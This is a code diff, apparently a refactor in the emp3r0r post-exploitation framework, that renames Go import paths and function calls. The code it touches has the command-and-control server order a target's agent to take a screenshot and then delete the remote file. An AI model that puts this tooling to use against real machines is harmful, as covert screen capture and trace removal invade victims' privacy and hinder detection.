@@ -8,8 +8,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
-	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
+	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
+	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/cc/server"
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -21,7 +21,7 @@ import (
 // open the picture if possible
 func TakeScreenshot(cmd *cobra.Command, args []string) {
 	// tell agent to take screenshot
-	screenshotErr := agent_util.SendCmdToCurrentTarget(emp3r0r_def.C2CmdScreenshot, "")
+	screenshotErr := agents.SendCmdToCurrentTarget(emp3r0r_def.C2CmdScreenshot, "")
 	if screenshotErr != nil {
 		logging.Errorf("send screenshot cmd: %v", screenshotErr)
 		return
@@ -89,7 +89,7 @@ func ProcessScreenshot(out string, target *emp3r0r_def.Emp3r0rAgent) (err error)
 	}
 
 	// tell agent to delete the remote file
-	err = agent_util.SendCmd("rm --path"+out, "", target)
+	err = agents.SendCmd("rm --path"+out, "", target)
 	if err != nil {
 		logging.Warningf("Failed to delete remote file %s: %v", strconv.Quote(out), err)
 	}
